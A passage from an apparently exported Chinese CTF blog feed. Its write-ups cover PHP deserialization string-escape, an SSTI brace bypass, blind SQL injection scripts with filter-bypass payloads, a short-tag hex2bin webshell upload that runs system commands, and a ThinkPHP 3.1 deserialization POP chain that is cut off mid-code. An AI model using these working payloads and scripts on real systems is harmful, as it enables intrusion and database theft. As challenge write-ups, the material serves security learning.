$res;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=unserialize($res);</span><br><span class="line"><span class="keyword">echo</span> $c-&gt;pass;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们需要做到的是，如何修改$pass的值？</p>
<p>首先当我们序列化一段A的的话得到的结果如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>并且我们注意到它会把bb变成ccc，当他序列化的时候，已经完成了，但是经过过滤之后它的字符串会变长，经历的是这么一个过程:</p>
<p><img src="image-20201120203006883.png" alt="image-20201120203006883"></p>
<p>同时，反序列化还有这么一个特点，一旦读取到<code>&#125;</code>，他就会停止，不会再读取后面的内容，这样的话就很好解释了，我们构造payload如下：</p>
<p><img src="image-20201120203254613.png" alt="image-20201120203254613"></p>
<p>成功修改了结果！</p>
<p>那么如果是变短的情况下呢？</p>
<h1 id="长短的区别："><a href="#长短的区别：" class="headerlink" title="长短的区别："></a>长短的区别：</h1><p>和前面变长的原理是<strong>不一样的</strong>，在反序列化逃逸变长的情况下，你需要做的是拼接自己后面需要写的东西，所以你所需要补充的长度=你payload的长度，并且你是写到末尾出现<code>&#125;</code> 为止，<strong>以此来使得后面的字符串丧失作用！！！！！！</strong>，也就是说如果是变短的字符串逃逸，你需要能够控制<strong>两个</strong>变量！</p>
<h1 id="变短："><a href="#变短：" class="headerlink" title="变短："></a>变短：</h1><p>而变短则截然不同，如果你需要变短，你要做的是<strong>吃掉你想要修改的部分的前面的part的全部</strong></p>
<p>我们一样的先看正常的情况下是如何进行序列化的</p>
<p><img src="image-20201120203446153.png" alt="image-20201120203446153"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;dasasdasd&quot;;s:4:&quot;pass&quot;;s:5:&quot;asdas&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们想要操作pass密码部分（控制后面的18是为了控制长度）的话，我们要吃掉的是</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&quot;;s:4:&quot;pass&quot;;s:18:&quot;</span><br></pre></td></tr></table></figure>

<p>那就很简单了，我们算一算这段的长度就好了！！！！！算出来是19，那我们写38个b，拼出来剩余19个，之后呢，我们去复写前面的那一段的内容就好了！</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;&#125;</span><br><span class="line">比如是这样哈，我们如果写19个bb，过滤之后剩下这些，这样的话到pass前面的部分都无了实际上进入的也就剩下</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc[中间的没了]&quot;;&#125;</span><br><span class="line">那假设我们的pass写成:&quot;;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;,再重新拼接之后就变变成了！</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;&quot;;&#125;这样的话就又正常了！！！</span><br></pre></td></tr></table></figure>



<p>过滤之后只剩下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:4:&quot;asds&quot;;&#125;&quot;;&#125; </span><br></pre></td></tr></table></figure>

<p>一些魔术方法：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>太湖杯easyweb</title>
    <url>/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/</url>
    <content><![CDATA[<p>感觉太湖杯的题目都挺难的..这次自己制作出来一道题，是一道SSTI，做的时候一开始还以为是nodejs进行命令执行什么的</p>
<h1 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h1><p>这道题的难点主要是过滤掉了花括号，和双引号等。</p>
<h1 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h1><p>这道题初看就感觉是一道SSTI，但是刚开始的时候被花括号卡住了，搞得我以为是是其他题目，结果相当想到A1CTF独角兽那道题目，才有了思路，首先，我们可以确定的是，我们输入一些花里胡哨的东西会被转换为标准的字符串输出，如图：</p>
<p><img src="image-20201107195218392.png" alt="image-20201107195218392"></p>
<p>于是我联想到可以通过输入类似的花括号的utf8编码下的字符串进行绕过：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/U+FE5C</span><br></pre></td></tr></table></figure>

<p>其中这一行</p>
<table>
<thead>
<tr>
<th>UTF-8 Encoding:</th>
<th><code>0xEF 0xB9 0x9C</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>我们将0x修改为百分号即可</p>
<p><img src="image-20201107195633976.png" alt="image-20201107195633976"></p>
<p>之后就是正常的SSTI了，我们将不需要引号的payload往上上一甩就行了</p>
<p><img src="image-20201107195717338.png" alt="image-20201107195717338"></p>
<h1 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h1><p>事后发现其实还可以利用这种方式进行命令执行：</p>
<p><img src="image-20201107214148115.png" alt="image-20201107214148115"></p>
]]></content>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战FinalSql</title>
    <url>/2020/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98FinalSql/</url>
    <content><![CDATA[<h1 id="1-考点"><a href="#1-考点" class="headerlink" title="1.考点"></a>1.考点</h1><p>盲注,学习到了新的姿势，当我们的if被过滤的时候，可以通过^的方式来操作</p>
<ul>
<li>?id=1=(表达式)=1</li>
<li>?id=1^(表达式)^1</li>
</ul>
<p>^ 在mysql当中代表的是位异或的意思，呃？百度了一下大概明白了一些</p>
<p>两个数相同得0，不同得1；那我们进一步拓展思路，也就是说两个表达式相同的时候就会返回1，不同的时候就会返回0</p>
<p>拓展思路之后可以得到如下结果：</p>
<p><img src="image-20201119170420138.png" alt="image-20201119170420138"></p>
<p>感觉还是用等号比较好理解啊</p>
<p>当两个=号夹在一起的时候</p>
<p><img src="image-20201119172606372.png" alt="image-20201119172606372"></p>
<p>条件成立的时候就返回前面的判断结果，不成立的话就返回全部的结果了。</p>
<p>于是构造注入语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(database(),1,1))&gt;102)&#x3D;1 </span><br></pre></td></tr></table></figure>

<p>得到数据库的名字：geek</p>
<p>接下来注入表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)&#x3D;database()),1,1))&gt;102)&#x3D;1 </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x3D;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;geek&#39;)),1,1))&gt;1)&#x3D;1</span><br></pre></td></tr></table></figure>

<p>得到表名：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">F1naI1y,Flaaaaag</span><br></pre></td></tr></table></figure>

<p>注入字段名：</p>
<p>id,username,password</p>
<p>flag在F1naI1y里面</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string, sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e5cde2c-f8e0-4059-a2e2-6121476516cc.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &quot;id=if(ascii(  substr( database() ,1,1)  )&gt;100,1,2)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stringlist = string.digits + string.ascii_letters</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, j)</span></span><br><span class="line">        sql = <span class="string">&quot;1=(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.get(url=url, params=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ingyingying~ Not this as wel&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">125</span>:</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure>

<p>得到答案：</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>红明谷杯web</title>
    <url>/2021/04/02/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/</url>
    <content><![CDATA[<h1 id="Happysql"><a href="#Happysql" class="headerlink" title="Happysql"></a>Happysql</h1><p>呜呜一点也不欢乐，这个题目真的恶心心，不过不算很难，主要是很久没做SQL了卡住了很久：</p>
<p>一开始以为是时间盲注瞎折腾了很久，发现还没生效</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">concat</span>(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>))<span class="comment">/**/</span>REGEXP<span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span></span><br></pre></td></tr></table></figure>

<p>后来才知道是双引号闭合，之后是布尔盲注。过滤挺多，</p>
<ul>
<li>符号过滤： = | &gt; | &lt;|空格|单引号双引号  等等</li>
<li>关键词： or|and|mid|substr| like | ord </li>
</ul>
<p>既然不能用 = 号的话我们可以用regexp来尝试进行绕过，需要表名的话也可以使用in来绕过，单双引号的绕过我们可以利用十六进制的特性进行绕过。</p>
<p>所以第一步我们的payload可以这样构造：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">23&quot;||case<span class="comment">/**/</span>when<span class="comment">/**/</span>(rpad((<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>database_name<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="keyword">database</span>())),<span class="number">26</span>,<span class="number">1</span>))regexp(<span class="number">0x2c2c</span>)<span class="comment">/**/</span><span class="keyword">then</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">else</span><span class="comment">/**/</span><span class="number">0</span><span class="comment">/**/</span><span class="keyword">end</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>这样子我们就可以得到表名了，但是比较尴尬的是innodb_table_stats这个表没有办法获取到字段名，但是没关系，我们依然可以通过join的方法来绕过，给出payload如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union all select*from (select * from users as a join users b)c--+</span><br></pre></td></tr></table></figure>

<p>后续列名依然可以：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union all select*from (select * from users as a join users b using(id,username))c--+</span><br></pre></td></tr></table></figure>

<p>最后结合regexp把payload拼出来就好：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string,re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="built_in">int</span>(b, <span class="number">16</span>) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>)]])</span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6jljai3r40l545qre.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">t=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>,<span class="number">80</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> re.escape(<span class="string">&#x27;&#x27;&#x27;,0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;&#123;#%&amp;()-./:;&lt;=&gt;?@[\\]^_`|&#125;~&#x27;&#x27;&#x27;</span>):</span><br><span class="line">        payload=<span class="string">&quot;database()&quot;</span> <span class="comment">#ctf</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">&quot;select group_concat(table_name) from mysql.innodb_table_stats where database_name in (database())&quot;</span> <span class="comment">#ctf,f1ag</span></span><br><span class="line">        <span class="comment">#payload=&#x27;version()&#x27; 10.4.13-mariadb</span></span><br><span class="line">        <span class="comment">#payload=&#x27;select b from (select 1 as b union select * from f1ag)as a&#x27;</span></span><br><span class="line">        payload=<span class="string">&#x27;select group_concat(a.1) from (select 1 union select * from f1ag) as a&#x27;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:(<span class="string">&#x27;wa123123&quot;||case when (rpad((&#123;&#125;),&#123;&#125;,1))regexp(0x&#123;&#125;) then 1 else 0 end#&#x27;</span>.<span class="built_in">format</span>(payload,i,flag+<span class="built_in">hex</span>(<span class="built_in">ord</span>(j)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        print(data)<span class="comment">#6374662c66316167</span></span><br><span class="line">        res = requests.post(url=url, data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;meta http-equiv=&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(j)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            t+=j</span><br><span class="line">            print(flag,t)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;injection&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<p>这里再补充几个绕过information_schema的trick</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql.innodb_table_stats</span></span><br></pre></td></tr></table></figure>



<p>绕过等号的办法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name regexp database()</span><br><span class="line"></span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name in (database())</span><br><span class="line"># 使用in的话后者必须用括号括起来</span><br></pre></td></tr></table></figure>



<h1 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h1><p>这道题反而是所有题目当中最好做的..</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题用短标签+hex2bin结合即可绕过所有过滤..</p>
<p>查看phpinfo：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;assert(hex2bin(&quot;00706870696e666f2829&quot;))?&gt;</span><br></pre></td></tr></table></figure>

<p>发现可以用shell_exec，正好还可以用短标签输出出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload&amp;data=<span class="meta">&lt;?=</span>assert(hex2bin(<span class="string">&quot;7072696e74287368656c6c5f657865632827636174202f2177686174796f7577616e74676767676767673430312e7068702729293b&quot;</span>))<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>BUU上的环境有变化，直接出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;assert(hex2bin(&quot;73797374656d2822636174202f666c6c6c6c6c6c6c313131323232323232326c616722293b&quot;))?&gt;</span><br></pre></td></tr></table></figure>

<p>原版本的pyaload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?action=upload&amp;data=<span class="meta">&lt;?=</span>`ls%<span class="number">09</span>/`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h1><p>通过ThinkVERION 找到版本为3.1。百度payload，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;thinkphp3&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3307&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $pk;</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span 